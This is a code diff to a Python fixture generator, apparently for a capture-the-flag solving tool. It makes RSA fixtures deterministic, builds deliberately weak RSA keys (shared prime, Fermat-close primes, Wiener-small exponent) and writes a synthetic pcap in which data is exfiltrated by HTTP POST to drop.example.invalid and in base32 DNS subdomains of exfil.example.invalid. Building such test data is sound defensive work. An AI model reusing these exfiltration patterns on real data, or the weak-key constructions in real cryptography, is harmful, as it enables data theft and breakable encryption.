@@ -300,10 +300,21 @@ def next_prime(start: int) -> int:
     return candidate
 
 
+def oaep(key):
+    """PKCS1_OAEP with our seeded RNG: the padding is random, the fixture must not be."""
+    return PKCS1_OAEP.new(key, randfunc=RNG.randbytes)
+
+
+def pkcs1v15(key):
+    """Same for PKCS#1 v1.5, whose padding is random non-zero bytes."""
+    return PKCS1_v1_5.new(key, randfunc=RNG.randbytes)
+
+
 def write_rsa_fixtures() -> None:
     """One RSA fixture per classic mistake, plus a correct keypair.
 
-    `getPrime(..., randfunc=RNG.randbytes)` keeps everything deterministic.
+    `getPrime(..., randfunc=RNG.randbytes)` and the two wrappers above keep every
+    byte deterministic: running `make fixtures` twice must produce no diff.
     """
     # 1. A correct 1024-bit keypair, with the flag under OAEP and under PKCS#1 v1.5.
     p = getPrime(512, randfunc=RNG.randbytes)
@@ -312,10 +323,10 @@ def write_rsa_fixtures() -> None:
     write("rsa_private.pem", key.export_key())
     write("rsa_public.pem", key.publickey().export_key())
     secret = b"CYBN{fixture_rsa_oaep}"
-    write("rsa_oaep.bin", PKCS1_OAEP.new(key.publickey()).encrypt(secret))
+    write("rsa_oaep.bin", oaep(key.publickey()).encrypt(secret))
     write(
         "rsa_pkcs1v15.bin",
-        PKCS1_v1_5.new(key.publickey()).encrypt(b"CYBN{fixture_rsa_pkcs1v15}"),
+        pkcs1v15(key.publickey()).encrypt(b"CYBN{fixture_rsa_pkcs1v15}"),
     )
     # The textbook case: no padding at all, which plenty of challenges use.
     textbook = bytes_to_long(b"CYBN{fixture_rsa_textbook}")
@@ -343,7 +354,7 @@ def write_rsa_fixtures() -> None:
     write("rsa_shared_b.pub.pem", RSA.construct((n_b, 65537)).export_key())
     key_a = RSA.construct((n_a, 65537, inverse(65537, (shared - 1) * (other_a - 1))))
     write(
-        "rsa_shared_a.bin", PKCS1_OAEP.new(key_a.publickey()).encrypt(b"CYBN{fixture_rsa_shared}")
+        "rsa_shared_a.bin", oaep(key_a.publickey()).encrypt(b"CYBN{fixture_rsa_shared}")
     )
 
     # 4. p and q next to each other: Fermat finds them in a few steps.
@@ -354,7 +365,7 @@ def write_rsa_fixtures() -> None:
     key_close = RSA.construct((n_close, 65537, inverse(65537, (p_close - 1) * (q_close - 1))))
     write("rsa_fermat.pub.pem", RSA.construct((n_close, 65537)).export_key())
     write(
-        "rsa_fermat.bin", PKCS1_OAEP.new(key_close.publickey()).encrypt(b"CYBN{fixture_rsa_fermat}")
+        "rsa_fermat.bin", oaep(key_close.publickey()).encrypt(b"CYBN{fixture_rsa_fermat}")
     )
 
     # 5. A private exponent far too small: Wiener's attack.
@@ -371,17 +382,134 @@ def write_rsa_fixtures() -> None:
     n_w = pw * qw
     write("rsa_wiener.pub.pem", RSA.construct((n_w, e_big)).export_key())
     key_w = RSA.construct((n_w, e_big, d_small, pw, qw))
-    write("rsa_wiener.bin", PKCS1_OAEP.new(key_w.publickey()).encrypt(b"CYBN{fixture_rsa_wiener}"))
+    write("rsa_wiener.bin", oaep(key_w.publickey()).encrypt(b"CYBN{fixture_rsa_wiener}"))
 
     # 6. The layered case CLAUDE.md asks for: an AES key||iv blob wrapped with
     #    RSA-OAEP, and the payload encrypted with that AES key.
     blob = RNG.randbytes(48)
-    write("rsa_wrapped_key.bin", PKCS1_OAEP.new(key.publickey()).encrypt(blob))
+    write("rsa_wrapped_key.bin", oaep(key.publickey()).encrypt(blob))
     payload = b"CYBN{fixture_rsa_wrapped_aes} the key travelled inside the RSA blob."
     write(
         "rsa_wrapped_payload.bin",
         AES.new(blob[:32], AES.MODE_CBC, blob[32:]).encrypt(pad(payload, 16)),
     )
+
+
+def pcap_packet(payload: bytes, timestamp: int) -> bytes:
+    """One classic-pcap record: 16-byte header, then the frame."""
+    return struct.pack("<IIII", timestamp, 0, len(payload), len(payload)) + payload
+
+
+def ethernet_ipv4(source: str, destination: str, protocol: int, body: bytes) -> bytes:
+    """An Ethernet frame carrying an IPv4 packet (no checksums: nothing verifies them)."""
+
+    def address(text: str) -> bytes:
+        return bytes(int(part) for part in text.split("."))
+
+    header = (
+        struct.pack(">BBHHHBBH", 0x45, 0, 20 + len(body), 0, 0, 64, protocol, 0)
+        + address(source)
+        + address(destination)
+    )
+    ether = b"\xaa\xbb\xcc\xdd\xee\x01" + b"\xaa\xbb\xcc\xdd\xee\x02" + b"\x08\x00"
+    return ether + header + body
+
+
+def tcp_segment(source_port: int, destination_port: int, sequence: int, payload: bytes) -> bytes:
+    header = struct.pack(
+        ">HHIIBBHHH", source_port, destination_port, sequence, 0, 0x50, 0x18, 8192, 0, 0
+    )
+    return header + payload
+
+
+def udp_datagram(source_port: int, destination_port: int, payload: bytes) -> bytes:
+    return struct.pack(">HHHH", source_port, destination_port, 8 + len(payload), 0) + payload
+
+
+def dns_query(name: str) -> bytes:
+    """A minimal DNS query message for `name`."""
+    labels = b"".join(bytes([len(part)]) + part.encode() for part in name.split("."))
+    return (
+        struct.pack(">HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0) + labels + b"\x00" + b"\x00\x01\x00\x01"
+    )
+
+
+def write_pcap_fixture() -> None:
+    """A capture shaped like a real forensics challenge.
+
+    Three things to find: an HTTP response body with the flag, a POST that
+    uploads a base64 blob, and a DNS exfiltration in base32 subdomains. The TCP
+    payloads are deliberately split across packets so the reassembly is exercised.
+    """
+    client, server = "10.0.0.5", "93.184.216.34"
+    records = []
+    time = 1700000000
+
+    # 1. An HTTP response whose body carries the flag, split over two packets.
+    body = (
+        b"<html><body><h1>Internal report</h1>\n"
+        b"<p>The archive password is CYBN{fixture_pcap_http}</p>\n"
+        b"</body></html>\n"
+    )
+    response = (
+        b"HTTP/1.1 200 OK\r\n"
+        b"Server: nginx/1.18.0\r\n"
+        b"Content-Type: text/html\r\n"
+        b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body
+    )
+    request = (
+        b"GET /report.html HTTP/1.1\r\nHost: intranet.example.invalid\r\n"
+        b"User-Agent: curl/8.0\r\n\r\n"
+    )
+    records.append(
+        pcap_packet(ethernet_ipv4(client, server, 6, tcp_segment(49152, 80, 1000, request)), time)
+    )
+    cut = 60
+    records.append(
+        pcap_packet(
+            ethernet_ipv4(server, client, 6, tcp_segment(80, 49152, 5000, response[:cut])), time
+        )
+    )
+    records.append(
+        pcap_packet(
+            ethernet_ipv4(server, client, 6, tcp_segment(80, 49152, 5000 + cut, response[cut:])),
+            time + 1,
+        )
+    )
+
+    # 2. A POST that uploads a base64 blob (the classic exfiltration over HTTP).
+    secret = base64.b64encode(b"CYBN{fixture_pcap_upload} stolen from the workstation")
+    post_body = b"data=" + secret
+    post = (
+        b"POST /upload.php HTTP/1.1\r\nHost: drop.example.invalid\r\n"
+        b"Content-Type: application/x-www-form-urlencoded\r\n"
+        b"Content-Length: " + str(len(post_body)).encode() + b"\r\n\r\n" + post_body
+    )
+    records.append(
+        pcap_packet(ethernet_ipv4(client, server, 6, tcp_segment(49153, 80, 2000, post)), time + 2)
+    )
+
+    # 3. DNS exfiltration: base32 of the flag, 8 characters per query.
+    payload = base64.b32encode(b"CYBN{fixture_pcap_dns}").decode().rstrip("=")
+    chunks = [payload[index : index + 8] for index in range(0, len(payload), 8)]
+    for number, chunk in enumerate(chunks):
+        query = dns_query(f"{chunk}.exfil.example.invalid")
+        records.append(
+            pcap_packet(
+                ethernet_ipv4(client, "8.8.8.8", 17, udp_datagram(40000 + number, 53, query)),
+                time + 3 + number,
+            )
+        )
+
+    # 4. Noise: an unrelated DNS lookup and a short TCP segment.
+    records.append(
+        pcap_packet(
+            ethernet_ipv4(client, "8.8.8.8", 17, udp_datagram(40100, 53, dns_query("example.com"))),
+            time + 20,
+        )
+    )
+    header = struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)
+    write("capture.pcap", header + b"".join(records))
 
 
 def main() -> None:
@@ -545,6 +673,9 @@ def main() -> None:
     # Every key below is generated from the fixed seed, so the files never change.
     # They are all deliberately weak, one mistake each.
     write_rsa_fixtures()
+
+    # --- pcap (improvement idea 4) ---
+    write_pcap_fixture()
 
 
 if __name__ == "__main__":
